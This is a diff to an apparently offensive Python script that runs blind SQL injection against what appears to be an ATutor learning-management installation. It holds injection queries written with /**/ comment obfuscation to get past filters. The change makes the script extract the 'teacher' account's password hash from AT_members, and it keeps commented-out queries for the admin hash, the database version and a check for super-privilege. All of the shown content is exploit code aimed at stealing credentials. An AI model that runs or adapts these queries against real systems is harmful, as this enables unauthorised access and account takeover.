@@ -140,19 +140,27 @@ def main():
     
     db_version_query = "select/**/version()"
     current_user_query = "current_user()"
+    teacher_hash_query = "select/**/password/**/from/**/AT_members/**/where/**/login='teacher'"
     admin_hash_query = "select/**/password/**/from/**/AT_admins/**/where/**/login='admin'"
+
+
 
     #temp = getLength(ip,db_version_query,1,20)
     #getString(ip,db_version_query, temp )
 
-    temp = getLength(ip,current_user_query, 1, 20)
-    username = getString(ip,current_user_query, temp)
+    #temp = getLength(ip,current_user_query, 1, 20)
+    #username = getString(ip,current_user_query, temp)
 
-    current_user_is_dbadmin_query = F"SELECT(SELECT/**/COUNT(*)/**/FROM/**/mysql.user/**/WHERE/**/Super_priv/**/='Y'/**/AND/**/current_user='{username}')>1"
-    question(ip, current_user_is_dbadmin_query)
+    #current_user_is_dbadmin_query = F"SELECT(SELECT/**/COUNT(*)/**/FROM/**/mysql.user/**/WHERE/**/Super_priv/**/='Y'/**/AND/**/current_user='{username}')>1"
+    #question(ip, current_user_is_dbadmin_query)
+
+    teacher_hash_length = getLength(ip, teacher_hash_query, 1, 100)
+    teacher_hash = getString(ip, teacher_hash_query, teacher_hash_length)
+    
     #admin_hash_length = getLength(ip,admin_hash_query, 1, 100)
     #admin_hash = getString(ip, admin_hash_query, admin_hash_length)
-    #sub_query = "(select/**/password/**/from/**/AT_admins/**/where login='admin'"
+
+
 
     # old
     #extractDBVersion(ip)
